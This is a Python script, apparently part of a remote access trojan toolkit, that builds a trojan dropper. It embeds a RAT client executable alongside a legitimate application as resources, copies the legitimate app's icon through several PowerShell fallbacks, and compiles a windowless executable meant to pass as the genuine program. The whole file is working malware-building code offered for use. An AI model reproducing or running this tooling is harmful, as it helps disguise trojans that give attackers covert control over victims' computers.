#!/usr/bin/env python3
import os
import sys
import shutil
import subprocess
from colorama import Fore, Style, init # type: ignore
import tempfile
import ctypes
from ctypes import windll, byref, create_string_buffer, create_unicode_buffer, wintypes

# Add path to parent directory to allow imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
# Now import from the parent's modules directory
from modules.server_ui_utils import print_banner as server_print_banner

# Initialize colorama
init()

# Constants for icon extraction
RT_ICON = 3
RT_GROUP_ICON = 14

def extract_icon(exe_path, icon_path):
    """Extract the icon from an executable file"""
    try:
        print(f"{Fore.YELLOW}Extracting icon from {exe_path}...{Style.RESET_ALL}")
        
        # Method 1: Try using our custom Python extractor
        if os.path.exists("extract_icon.py"):
            extract_cmd = f'python extract_icon.py "{exe_path}" "{icon_path}"'
            result = subprocess.run(extract_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0 and os.path.exists(icon_path) and os.path.getsize(icon_path) > 100:
                print(f"{Fore.GREEN}Icon extracted successfully to {icon_path}{Style.RESET_ALL}")
                return True
        
        # Method 2: Try using PowerShell's ExtractAssociatedIcon
        extract_cmd = f'powershell -Command "$icon = [System.Drawing.Icon]::ExtractAssociatedIcon(\'{exe_path}\'); $icon.Save(\'{icon_path}\')"'
        result = subprocess.run(extract_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0 or not os.path.exists(icon_path) or os.path.getsize(icon_path) < 100:
            # Method 3: Try using PowerShell's GetIconHandle
            extract_cmd = f'powershell -Command "$handle = (Add-Type -MemberDefinition \'[DllImport(\\"Shell32.dll\\")] public static extern IntPtr ExtractIcon(IntPtr hInst, string lpszExeFileName, int nIconIndex);\' -Name ExtractIcon -Namespace Shell32 -PassThru)::ExtractIcon(0, \'{exe_path}\', 0); if ($handle -ne 0) {{ $icon = [System.Drawing.Icon]::FromHandle($handle); $icon.Save(\'{icon_path}\'); }}"'
            result = subprocess.run(extract_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0 or not os.path.exists(icon_path) or os.path.getsize(icon_path) < 100:
            # Method 4: Try using our C++ icon extractor
            icon_extractor = os.path.join(os.path.dirname(__file__), "icon_extractor.exe")
            if os.path.exists(icon_extractor):
                extract_cmd = f'"{icon_extractor}" "{exe_path}" "{icon_path}"'
                result = subprocess.run(extract_cmd, shell=True, capture_output=True, text=True)
        
        # Verify the icon file is valid
        if not os.path.exists(icon_path) or os.path.getsize(icon_path) < 100:
            # If all methods fail, create a simple icon file
            print(f"{Fore.YELLOW}Warning: Could not extract icon, creating a default icon.{Style.RESET_ALL}")
            
            # Create a simple default icon using PowerShell
            default_icon_cmd = f'powershell -Command "$bitmap = New-Object System.Drawing.Bitmap 32, 32; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.Clear([System.Drawing.Color]::Transparent); $graphics.DrawRectangle([System.Drawing.Pens]::Blue, 0, 0, 31, 31); $icon = [System.Drawing.Icon]::FromHandle($bitmap.GetHicon()); $icon.Save(\'{icon_path}\'); $graphics.Dispose(); $bitmap.Dispose()"'
            subprocess.run(default_icon_cmd, shell=True, capture_output=True, text=True)
            
            if not os.path.exists(icon_path) or os.path.getsize(icon_path) < 100:
                return False
        
        print(f"{Fore.GREEN}Icon extracted successfully to {icon_path}{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}Warning: Icon extraction failed: {str(e)}{Style.RESET_ALL}")
        return False

def print_binder_banner():
    """Print a custom banner for the binder without creator info"""
    # Get terminal width
    try:
        terminal_width = os.get_terminal_size().columns
    except OSError:
        terminal_width = 80  # Default width
    
    # ASCII art banner with gradient colors (RED -> WHITE -> BLUE)
    banner = f"""
{Fore.RED}██████╗  {Fore.WHITE}█████╗  {Fore.LIGHTBLUE_EX}████████╗ {Fore.RED} █████╗  {Fore.WHITE}████████╗ {Fore.LIGHTBLUE_EX} ██████╗  {Fore.RED}██╗   ██╗ {Fore.WHITE}██╗ {Fore.LIGHTBLUE_EX}██╗     {Fore.RED}██╗        {Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}██╔══██╗ {Fore.WHITE}██╔══██╗ {Fore.LIGHTBLUE_EX}╚══██╔══╝ {Fore.RED}██╔══██╗ {Fore.WHITE}╚══██╔══╝ {Fore.LIGHTBLUE_EX}██╔═══██╗ {Fore.RED}██║   ██║ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║       {Fore.WHITE}██╔════╝{Style.RESET_ALL}
{Fore.RED}██████╔╝ {Fore.WHITE}███████║ {Fore.LIGHTBLUE_EX}   ██║    {Fore.RED}███████║ {Fore.WHITE}   ██║    {Fore.LIGHTBLUE_EX}██║   ██║ {Fore.RED}██║   ██║ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║       {Fore.WHITE}█████╗  {Style.RESET_ALL}
{Fore.RED}██╔══██╗ {Fore.WHITE}██╔══██║ {Fore.LIGHTBLUE_EX}   ██║    {Fore.RED}██╔══██║ {Fore.WHITE}   ██║    {Fore.LIGHTBLUE_EX}██║   ██║ {Fore.RED}██║   ██║ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║       {Fore.WHITE}██╔══╝  {Style.RESET_ALL}
{Fore.RED}██║  ██║ {Fore.WHITE}██║  ██║ {Fore.LIGHTBLUE_EX}   ██║    {Fore.RED}██║  ██║ {Fore.WHITE}   ██║    {Fore.LIGHTBLUE_EX}╚██████╔╝ {Fore.RED}╚██████╔╝ {Fore.WHITE}██║ {Fore.LIGHTBLUE_EX}███████╗ {Fore.RED}███████╗ {Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}╚═╝  ╚═╝ {Fore.WHITE}╚═╝  ╚═╝ {Fore.LIGHTBLUE_EX}   ╚═╝    {Fore.RED}╚═╝  ╚═╝ {Fore.WHITE}   ╚═╝    {Fore.LIGHTBLUE_EX}╚═════╝   {Fore.RED}╚═════╝  {Fore.WHITE}╚═╝ {Fore.LIGHTBLUE_EX}╚══════╝ {Fore.RED}╚══════╝ {Fore.WHITE}╚══════╝{Style.RESET_ALL}
"""
    
    # Print the banner
    if terminal_width < 171:
        # Center the banner for smaller terminals
        lines = banner.split('\n')
        for line in lines:
            if line.strip():
                padding = max(0, (terminal_width - len(line.strip())) // 2)
                print(' ' * padding + line)
            else:
                print(line)
    else:
        print(banner)

def print_binder_info():
    """Print binder-specific information"""
    print(f"{Fore.CYAN}RAT Client Binder{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Bind RAT client with legitimate applications{Style.RESET_ALL}\n")

def validate_file_exists(filepath):
    if not os.path.isfile(filepath):
        print(f"{Fore.RED}Error: File {filepath} does not exist!{Style.RESET_ALL}")
        return False
    return True

def bind_files(rat_client, legitimate_app, output_file, custom_icon=None):
    print(f"{Fore.CYAN}Binding files...{Style.RESET_ALL}")
    
    # Create a temporary directory with a unique name to avoid conflicts
    temp_dir = f"temp_binding_{os.getpid()}"
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir, exist_ok=True)
    
    try:
        # Compile the binder if needed
        if not os.path.exists("rat_client_binder.exe"):
            print(f"{Fore.YELLOW}Compiling binder...{Style.RESET_ALL}")
            compile_cmd = "g++ -o rat_client_binder.exe rat_client_binder.cpp -lws2_32 -static-libgcc -static-libstdc++"
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{Fore.RED}Compilation failed:{Style.RESET_ALL}")
                print(result.stderr)
                return False
        
        # Copy files to temp directory
        print(f"{Fore.YELLOW}Copying files to temporary directory...{Style.RESET_ALL}")
        rat_client_dest = os.path.join(temp_dir, "rat_client.exe")
        legit_app_dest = os.path.join(temp_dir, "legit_app.exe")
        
        shutil.copy(rat_client, rat_client_dest)
        shutil.copy(legitimate_app, legit_app_dest)
        
        # Handle icon
        icon_path = os.path.join(temp_dir, "app_icon.ico")
        icon_extracted = False
        
        if custom_icon:
            # Use custom icon if provided
            if validate_file_exists(custom_icon):
                print(f"{Fore.YELLOW}Using custom icon from {custom_icon}...{Style.RESET_ALL}")
                shutil.copy(custom_icon, icon_path)
                icon_extracted = True
            else:
                print(f"{Fore.RED}Custom icon file not found. Will try to extract from legitimate app.{Style.RESET_ALL}")
        
        # If no custom icon or custom icon not found, extract from legitimate app
        if not icon_extracted:
            icon_extracted = extract_icon(legitimate_app, icon_path)
        
        # Create the resource script
        rc_file = os.path.join(temp_dir, "resources.rc")
        with open(rc_file, 'w') as f:
            f.write('101 RCDATA "rat_client.exe"\n')
            f.write('102 RCDATA "legit_app.exe"\n')
            # Add icon resource if extraction was successful
            if icon_extracted:
                f.write('1 ICON "app_icon.ico"\n')
        
        # Compile the resource script
        print(f"{Fore.YELLOW}Compiling resources...{Style.RESET_ALL}")
        windres_cmd = f'windres -i {rc_file} -o {os.path.join(temp_dir, "resources.o")}'
        result = subprocess.run(windres_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{Fore.RED}Resource compilation failed:{Style.RESET_ALL}")
            print(result.stderr)
            
            # Try alternative approach without icon
            print(f"{Fore.YELLOW}Trying alternative approach without icon...{Style.RESET_ALL}")
            with open(rc_file, 'w') as f:
                f.write('101 RCDATA "rat_client.exe"\n')
                f.write('102 RCDATA "legit_app.exe"\n')
            
            windres_cmd = f'windres -i {rc_file} -o {os.path.join(temp_dir, "resources.o")}'
            result = subprocess.run(windres_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"{Fore.RED}Resource compilation failed again:{Style.RESET_ALL}")
                print(result.stderr)
                return False
        
        # Compile the final executable with static linking
        print(f"{Fore.YELLOW}Creating final executable...{Style.RESET_ALL}")
        compile_cmd = f'g++ -o "{output_file}" rat_client_binder.cpp {os.path.join(temp_dir, "resources.o")} -lws2_32 -mwindows -static-libgcc -static-libstdc++'
        result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{Fore.RED}Binding failed:{Style.RESET_ALL}")
            print(result.stderr)
            return False
        
        print(f"{Fore.GREEN}Successfully bound files to {output_file}{Style.RESET_ALL}")
        return True
    
    except Exception as e:
        print(f"{Fore.RED}Error during binding process: {str(e)}{Style.RESET_ALL}")
        return False
    
    finally:
        # Clean up
        try:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
        except Exception as e:
            print(f"{Fore.YELLOW}Warning: Could not clean up temporary directory: {str(e)}{Style.RESET_ALL}")

def main():
    # Use the custom binder banner instead of the server banner
    print_binder_banner()
    print_binder_info()
    
    # Get user input
    print(f"{Fore.YELLOW}Enter the file paths:{Style.RESET_ALL}")
    
    rat_client = input(f"{Fore.CYAN}RAT client executable: {Style.RESET_ALL}")
    if not validate_file_exists(rat_client):
        return
    
    legitimate_app = input(f"{Fore.CYAN}Legitimate application: {Style.RESET_ALL}")
    if not validate_file_exists(legitimate_app):
        return
    
    output_file = input(f"{Fore.CYAN}Output filename: {Style.RESET_ALL}")
    if not output_file:
        output_file = "bound_application.exe"
    
    # Add .exe extension if not present
    if not output_file.lower().endswith('.exe'):
        output_file += '.exe'
    
    # Ask for custom icon path (optional)
    custom_icon = input(f"{Fore.CYAN}Custom icon path (optional, press Enter to extract from legitimate app): {Style.RESET_ALL}")
    
    # Bind the files
    print(f"\n{Fore.YELLOW}Binding files with the following settings:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}RAT client: {rat_client}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Legitimate application: {legitimate_app}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Output filename: {output_file}{Style.RESET_ALL}")
    if custom_icon:
        print(f"{Fore.WHITE}Custom icon: {custom_icon}{Style.RESET_ALL}")
    
    bind_files(rat_client, legitimate_app, output_file, custom_icon if custom_icon else None)

if __name__ == "__main__":
    main()









